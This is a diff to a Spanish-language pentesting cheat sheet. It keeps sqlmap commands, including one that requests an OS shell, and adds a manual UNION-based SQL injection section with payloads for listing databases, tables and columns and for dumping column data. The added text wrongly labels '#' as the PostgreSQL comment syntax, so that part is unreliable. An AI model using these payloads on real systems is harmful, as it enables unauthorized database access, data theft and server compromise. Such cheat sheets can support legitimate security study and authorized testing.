@@ -358,6 +358,28 @@ sqlmap -u "http://domain.com/path.aspx?id=1" --cookie="PHPSESSID=1tmgthfok042dsl
 PARA OBTENER LA OS SHELL
 sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low" --os-shell
 ```
+**Manual**
+Cuando la solicitud se refleja en la respuesta del sitio web, se pueden utilizar la palabra clave UNION SELECT, para que un ataque UNION pueda funcionar, primero se debe determinar la cantidad la cantidad de columnas y cada columna debe coincidir con el tipo de dato que se esta solicitando. 
+Comentarios en las diferentes bases de datos:
+'#' Sin las comillas > PostreSQL
+-- - > MySQL y Microsoft
+```
+'UNION SELECT null, null
+'UNION SELECT null, null FROM dual-- (en Oracle)
+
+Identificar nombres de las bases de datos
+' UNION SELECT schema_name, null FROM information_schema.schemata
+group_concat(schema_name) from information_schema.schemata
+
+Enlistar los nombres de todas las tablas de una base de datos
+' UNION SELECT table_name,null FROM information_schema.tables WHERE table_schema='nombre de la base de datos'
+
+Enlistar nombres de todas las columnas de una tabla
+'UNION SELECT column_name, null from information_schema.columns WHERE table_schema='nombre de la base de datos' AND table_name='nombre de la tabla'--
+
+Leer contenido de la columna
+'UNION SELECT campo1,campo2 FROM nombre de la tabla--
+```
 ## Privilege Escalation
 Recuerda: Usuario + contrasena + IP --> SSH
 ```
